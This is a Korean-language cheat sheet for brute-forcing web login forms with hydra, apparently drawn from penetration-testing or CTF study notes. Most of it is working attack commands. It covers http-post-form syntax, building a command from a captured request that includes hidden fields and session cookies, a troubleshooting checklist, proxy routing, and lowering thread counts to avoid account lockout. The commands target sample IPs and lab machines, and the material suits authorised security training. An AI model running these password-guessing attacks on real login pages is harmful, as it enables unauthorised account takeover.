# hydra — HTTP (로그인 폼)

- 웹 로그인 폼(HTTP/HTTPS)에 대한 온라인 패스워드 브루트포스 — http-post-form / https-post-form 모듈로 ^USER^·^PASS^ 치환, F= 실패 문구 판정
- 대상 로그인 폼 접근, hydra 설치(Kali 기본), 워드리스트(rockyou.txt·SecLists) — 실패 문구(F=)는 공백까지 정확히, 세션 쿠키 필요 시 H=Cookie: 헤더 추가, HTTPS는 https-post-form 사용
- 공통 옵션(-l/-L/-p/-P/-s/-t/-f/-V 등)과 전체 절차는 `hydra-structured.md`, `hydra_practice.md` 참고

## 기본형

```bash
# HTTP POST 로그인 폼
hydra -V -F -l admin -P passwords.txt 10.10.10.10 http-post-form "/login.php:username=^USER^&password=^PASS^:F=로그인실패문구"

# HTTPS 로그인 폼 (443)
hydra -l admin -P pass.txt <대상> https-post-form "/login:username=^USER^&password=^PASS^:F=failed"

# HTTPS 비표준 포트
hydra -l admin -P pass.txt <대상> -s 8443 https-post-form "/login:username=^USER^&password=^PASS^:F=failed"
```

## 문법 분석 (http-post-form)

```
hydra [옵션] <타겟> http-post-form "<경로>:<본문>:<판정조건>[:<추가옵션>]"
```

- 첫 번째 구역: POST를 보낼 경로 (예: `/login/index.php`)
- 두 번째 구역: 전송 본문. `^USER^`, `^PASS^` 자리에 목록 값이 대입됨. hidden 필드도 모두 포함
- 세 번째 구역: 성공/실패 판정 조건
  - `F=문구`: 응답에 이 문자열이 있으면 실패 (일반적)
  - `S=문구`: 응답에 이 문자열이 있으면 성공 (실패 페이지 구분이 애매할 때)
- 네 번째 구역(선택): 추가 헤더. `H=헤더이름:\ 값` 형식, 콜론은 `\:`로 이스케이프

선택 구역 안의 콜론은 반드시 `\:`로 이스케이프한다. 그대로 두면 구역 구분자로 해석되어 문법이 깨진다.

## 로그인 폼 분석 → hydra 조립 절차

### 1단계: 폼 구조 확인

```bash
curl -s http://<대상>/login/ | grep -E '<form|<input'
```

- `<form action>` 에서 POST 경로, `<input name>` 에서 필드명 확인
- `hidden` 필드(s_mod, s_pg, CSRF 토큰 등)를 여기서 찾는다
- hidden 필드를 빼먹으면 모든 시도가 실패 처리되어 브루트포스가 조용히 무의미해진다

### 2단계: 실패 응답 확인

틀린 값으로 한 번 제출(Burp 또는 브라우저 DevTools Network 탭)해서 응답의 실패 문구를 확인한다. 이 문구를 `F=`에 공백까지 정확히 복사한다.

### 3단계: 조립

캡처한 요청:

```
POST /login/index.php
Cookie: ISPCSESS=n5g33db3sjduau5fkoocckdvss

username=test&password=test2&s_mod=login&s_pg=index
```

조립 결과:

```bash
hydra -l admin -P /usr/share/seclists/Passwords/Common-Credentials/10k-most-common.txt -t 16 -f 192.168.110.101 http-post-form "/login/index.php:username=^USER^&password=^PASS^&s_mod=login&s_pg=index:F=Username or Password wrong"
```

- `test2` 자리를 `^PASS^`로 치환하고, 고정값(hidden 필드)은 그대로 둔다

### 세션 쿠키가 필요한 폼

```bash
# 1) 세션 쿠키 발급 (-w "%{http_code}" 로 200 확인 후 진행)
curl -s -c c.txt -o /dev/null -w "%{http_code}\n" http://<대상>/login/

# 2) 쿠키값 추출
COOKIE=$(grep ISPCSESS c.txt | awk '{print $7}')

# 3) H= 옵션으로 쿠키 헤더 추가
hydra -l admin -P pass.txt -t 16 -f <대상> http-post-form "/login/index.php:username=^USER^&password=^PASS^&s_mod=login&s_pg=index:F=Username or Password wrong:H=Cookie:\ ISPCSESS=$COOKIE"
```

- `-c c.txt`는 쿠키 저장(-b c.txt는 읽어서 요청에 실기)
- 세션 쿠키는 유휴 상태로 만료된다. 오래 걸리는 실행은 도중에 쿠키가 죽어 이후 시도가 전부 실패하므로, 작은 목록 단위로 쿠키를 재발급하며 돌린다

## 실전 예시

```bash
hydra -l admin -P passwords.txt 10.10.10.10 http-post-form "/login.php:username=^USER^&password=^PASS^:F=로그인실패문구"

hydra -L user.txt -P pass.txt 10.10.10.10 http-post-form "/login.php:user=^USER^&pass=^PASS^:F=incorrect" -V

hydra -l scr1ptkiddy -P passwords.txt 10.10.136.50 http-post-form "/silverpeas/jsp/login.jsp:username=^USER^&password=^PASS^&DomainId=0:Location"

sudo hydra -l R1ckRul3s -P rockyou.txt 10.65.165.164 http-post-form "/login.php:username=^USER^&password=^PASS^&submit=Login:F=login failed"

hydra -l molly -P rockyou.txt <MACHINE_IP> http-post-form "/login:username=^USER^&password=^PASS^:Your username or password is incorrect."

hydra -L users.txt -P pass.txt 192.168.1.100 http-post-form "/login.php:user=^USER^&pass=^PASS^:F=로그인실패문구"
```

## 전부 실패할 때 체크리스트

모든 시도가 실패로 나오면 도구 문제가 아니라 조립 문제인 경우가 대부분이다. 위에서부터 순서대로 확인:

1. `F=` 문구가 응답 복사본과 정확히 일치하는지 (오탈자, 공백)
2. hidden 필드를 본문에 다 넣었는지
3. 세션 쿠키가 필수인지 (쿠키 없이 수동 POST 해보면 안다) → `H=Cookie:` 추가
4. CSRF 토큰처럼 요청마다 바뀌는 값이 있는지 → hydra 부적합, Burp Intruder 매크로 또는 python 루프로 대체
5. HTTPS인데 `http-post-form`으로 돌리지 않았는지 → `https-post-form`
6. 폼 값에 특수문자가 있는지 → hydra는 URL 인코딩 없이 그대로 보낸다. 인코딩이 필요하면 python으로
7. 계정 잠금/차단 의심 → `-t 4` 이하로 낮추고 최소 목록부터 재시도

## 프록시 경유

```bash
HYDRA_PROXY=http://192.168.199.189:3128 hydra -L users.txt -P passes.txt -s 8080 127.0.0.1 http-post-form "/phpmyadmin/index.php:pma_username=^USER^&pma_password=^PASS^&server=2&target=index.php&token=TOKEN:F=Access denied" -t 4 -f -V
```

## 주의

- HTTP 폼의 실패 메시지는 정확하게 (공백까지!)
- 느린 크래킹이 의심되면 -t 값을 낮춤 (4~8)
- 결과를 파일로 저장: `-o results.txt`
- CSRF 토큰 때문에 hydra가 안 통하는 폼은 ffuf(-H 헤더), Burp Intruder(매크로), python(requests 루프)으로 대체
